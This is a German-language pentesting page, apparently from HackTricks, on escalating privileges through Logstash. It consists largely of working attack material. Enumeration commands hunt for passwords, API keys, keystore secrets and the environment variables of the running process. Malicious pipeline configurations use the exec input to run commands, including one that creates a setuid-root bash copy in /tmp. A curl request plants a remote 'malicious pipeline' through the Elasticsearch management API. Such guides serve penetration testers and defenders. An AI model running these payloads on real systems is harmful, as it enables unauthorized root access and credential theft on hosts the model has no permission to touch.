# Logstash Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Logstash

Logstash wird verwendet, um **Logs zu sammeln, zu transformieren und weiterzuleiten**. Dies erfolgt über ein System, das als **Pipelines** bezeichnet wird. Diese Pipelines bestehen aus den Phasen **input**, **filter** und **output**. Ein interessanter Aspekt ergibt sich, wenn Logstash auf einem kompromittierten System ausgeführt wird.

### Pipeline-Konfiguration

Pipelines werden in der Datei **/etc/logstash/pipelines.yml** konfiguriert. Diese Datei listet die Speicherorte der Pipeline-Konfigurationen auf:
```yaml
# Define your pipelines here. Multiple pipelines can be defined.
# For details on multiple pipelines, refer to the documentation:
# https://www.elastic.co/guide/en/logstash/current/multiple-pipelines.html

- pipeline.id: main
path.config: "/etc/logstash/conf.d/*.conf"
- pipeline.id: example
path.config: "/usr/share/logstash/pipeline/1*.conf"
pipeline.workers: 6
```
Diese Datei zeigt, wo sich die **.conf**-Dateien mit den Pipeline-Konfigurationen befinden. Bei Verwendung eines **Elasticsearch output module** ist es üblich, dass **pipelines** **Elasticsearch credentials** enthalten, die häufig weitreichende Berechtigungen besitzen, da Logstash Daten in Elasticsearch schreiben muss. Wildcards in den Konfigurationspfaden ermöglichen es Logstash, alle passenden **pipelines** im angegebenen Verzeichnis auszuführen.

Wenn Logstash mit `-f <directory>` anstelle von `pipelines.yml` gestartet wird, werden **alle Dateien in diesem Verzeichnis** in lexikografischer Reihenfolge zusammengefügt und als eine einzige Konfiguration geparst. Dies hat 2 offensive Auswirkungen:

- Eine abgelegte Datei wie `000-input.conf` oder `zzz-output.conf` kann beeinflussen, wie die endgültige Pipeline zusammengesetzt wird
- Eine fehlerhafte Datei kann verhindern, dass die gesamte Pipeline geladen wird. Daher müssen Payloads sorgfältig validiert werden, bevor auf den Auto-Reload vertraut wird

### Schnelle Enumeration auf einem kompromittierten Host

Auf einem System, auf dem Logstash installiert ist, sollte man schnell Folgendes prüfen:
```bash
ps aux | grep -i logstash
systemctl cat logstash 2>/dev/null
cat /etc/logstash/pipelines.yml 2>/dev/null
cat /etc/logstash/logstash.yml 2>/dev/null
find /etc/logstash /usr/share/logstash -maxdepth 3 -type f \( -name '*.conf' -o -name 'logstash.yml' -o -name 'pipelines.yml' \) -ls
rg -n --hidden -S 'password|passwd|api[_-]?key|cloud_auth|ssl_keystore_password|truststore_password|user\s*=>|hosts\s*=>' /etc/logstash /usr/share/logstash 2>/dev/null
```
Prüfe außerdem, ob die lokale Monitoring-API erreichbar ist. Standardmäßig lauscht sie auf **127.0.0.1:9600**, was nach dem Zugriff auf den Host normalerweise ausreicht:
```bash
curl -s http://127.0.0.1:9600/?pretty
curl -s http://127.0.0.1:9600/_node/pipelines?pretty
curl -s http://127.0.0.1:9600/_node/stats/pipelines?pretty
```
Dies liefert normalerweise Pipeline-IDs, Laufzeitdetails und die Bestätigung, dass deine modifizierte Pipeline geladen wurde.

Mit Logstash wiederhergestellte Zugangsdaten ermöglichen häufig den Zugriff auf **Elasticsearch**. Sieh dir daher [diese andere Seite über Elasticsearch](../../network-services-pentesting/9200-pentesting-elasticsearch.md) an.

### Privilege Escalation über beschreibbare Pipelines

Um eine Privilege Escalation zu versuchen, identifiziere zunächst den Benutzer, unter dem der Logstash-Service ausgeführt wird, typischerweise der Benutzer **logstash**. Stelle sicher, dass **eines** der folgenden Kriterien erfüllt ist:

- Du besitzt **Schreibzugriff** auf eine Pipeline-**.conf**-Datei **oder**
- Die Datei **/etc/logstash/pipelines.yml** verwendet einen Wildcard, und du kannst in den Zielordner schreiben

Zusätzlich muss **eine** der folgenden Bedingungen erfüllt sein:

- Du kannst den Logstash-Service neu starten **oder**
- In der Datei **/etc/logstash/logstash.yml** ist **config.reload.automatic: true** gesetzt

Wenn die Konfiguration einen Wildcard enthält, ermöglicht das Erstellen einer Datei, die diesem Wildcard entspricht, die Ausführung von Befehlen. Zum Beispiel:
```bash
input {
exec {
command => "whoami"
interval => 120
}
}

output {
file {
path => "/tmp/output.log"
codec => rubydebug
}
}
```
Hier bestimmt **interval** die Ausführungshäufigkeit in Sekunden. Im angegebenen Beispiel wird der Befehl **whoami** alle 120 Sekunden ausgeführt, wobei seine Ausgabe nach **/tmp/output.log** geschrieben wird.

Mit **config.reload.automatic: true** in **/etc/logstash/logstash.yml** erkennt Logstash neue oder geänderte Pipeline-Konfigurationen automatisch und wendet sie an, ohne dass ein Neustart erforderlich ist. Wenn kein Wildcard verwendet wird, können bestehende Konfigurationen weiterhin geändert werden. Dabei ist jedoch Vorsicht geboten, um Unterbrechungen zu vermeiden.

### Zuverlässigere Pipeline-Payloads

Das `exec` input plugin funktioniert auch in aktuellen Releases weiterhin und erfordert entweder ein `interval` oder einen `schedule`. Es führt den Logstash JVM durch **forking** aus. Wenn der Speicher knapp ist, kann dein Payload daher mit **ENOMEM** fehlschlagen, anstatt unbemerkt ausgeführt zu werden.

Ein praktischeres privilege-escalation-Payload hinterlässt normalerweise ein dauerhaftes Artefakt:
```bash
input {
exec {
command => "cp /bin/bash /tmp/logroot && chown root:root /tmp/logroot && chmod 4755 /tmp/logroot"
interval => 300
}
}
output {
null {}
}
```
Wenn du keine Neustartrechte hast, aber dem Prozess ein Signal senden kannst, unterstützt Logstash auf Unix-ähnlichen Systemen auch ein durch **SIGHUP** ausgelöstes Neuladen:
```bash
kill -SIGHUP $(pgrep -f logstash)
```
Beachte, dass nicht jedes Plugin reload-freundlich ist. Beispielsweise verhindert der **stdin**-Input das automatische Reloading. Gehe daher nicht davon aus, dass `config.reload.automatic` deine Änderungen immer übernimmt.

### Secrets aus Logstash stehlen

Bevor du dich ausschließlich auf Codeausführung konzentrierst, solltest du die Daten sammeln, auf die Logstash bereits Zugriff hat:

- Klartext-Zugangsdaten sind häufig direkt in `elasticsearch {}`-Outputs, `http_poller`- und JDBC-Inputs oder Cloud-bezogenen Einstellungen hinterlegt
- Sichere Einstellungen können sich in **`/etc/logstash/logstash.keystore`** oder einem anderen `path.settings`-Verzeichnis befinden
- Das Keystore-Passwort wird häufig über **`LOGSTASH_KEYSTORE_PASS`** bereitgestellt. Bei paketbasierten Installationen stammt es üblicherweise aus **`/etc/sysconfig/logstash`**
- Die Auflösung von Umgebungsvariablen mit `${VAR}` erfolgt beim Start von Logstash. Daher lohnt es sich, die Service-Umgebung zu untersuchen

Nützliche Prüfungen:
```bash
ls -l /etc/logstash /etc/logstash/logstash.keystore 2>/dev/null
strings /etc/logstash/conf.d/*.conf 2>/dev/null | head
tr '\0' '\n' < /proc/$(pgrep -o -f logstash)/environ 2>/dev/null | sort
cat /etc/sysconfig/logstash 2>/dev/null
journalctl -u logstash --no-pager 2>/dev/null | tail -n 200
ls -lah /var/log/logstash 2>/dev/null
```
Dies ist ebenfalls eine Überprüfung wert, da **CVE-2023-46672** gezeigt hat, dass Logstash unter bestimmten Umständen vertrauliche Informationen in Logs speichern konnte. Auf einem Host nach der Kompromittierung können alte Logstash-Logs und `journald`-Einträge daher Zugangsdaten offenlegen, selbst wenn die aktuelle Konfiguration auf den Keystore verweist, anstatt Secrets inline zu speichern.

### Missbrauch der zentralisierten Pipeline-Verwaltung

In einigen Umgebungen verwendet der Host überhaupt keine lokalen `.conf`-Dateien. Wenn **`xpack.management.enabled: true`** konfiguriert ist, kann Logstash zentral verwaltete Pipelines von Elasticsearch/Kibana abrufen. Nach der Aktivierung dieses Modus sind lokale Pipeline-Konfigurationen nicht mehr die maßgebliche Quelle.

Das bedeutet einen anderen Angriffspfad:

1. Elastic-Zugangsdaten aus lokalen Logstash-Einstellungen, dem Keystore oder Logs wiederherstellen
2. Überprüfen, ob das Konto über das Cluster-Recht **`manage_logstash_pipelines`** verfügt
3. Eine zentral verwaltete Pipeline erstellen oder ersetzen, sodass der Logstash-Host bei seinem nächsten Polling-Intervall deinen Payload ausführt

Die für diese Funktion verwendete Elasticsearch-API lautet:
```bash
curl -X PUT http://ELASTIC:9200/_logstash/pipeline/pwned \
-H 'Content-Type: application/json' \
-u user:password \
-d '{
"description": "malicious pipeline",
"pipeline": "input { exec { command => \"id > /tmp/.ls-rce\" interval => 120 } } output { null {} }",
"pipeline_metadata": {"type": "logstash_pipeline", "version": "1"},
"pipeline_settings": {"pipeline.workers": 1, "pipeline.batch.size": 1}
}'
```
Dies ist besonders nützlich, wenn lokale Dateien schreibgeschützt sind, Logstash jedoch bereits für den Abruf von Pipelines aus der Ferne registriert ist.

## Referenzen

- [Elastic-Dokumentation: Konfigurationsdatei neu laden](https://www.elastic.co/guide/en/logstash/8.19/reloading-config.html)
- [Elastic-Dokumentation: Zentrale Pipeline-Verwaltung konfigurieren](https://www.elastic.co/guide/en/logstash/8.19/configuring-centralized-pipelines.html)

{{#include ../../banners/hacktricks-training.md}}
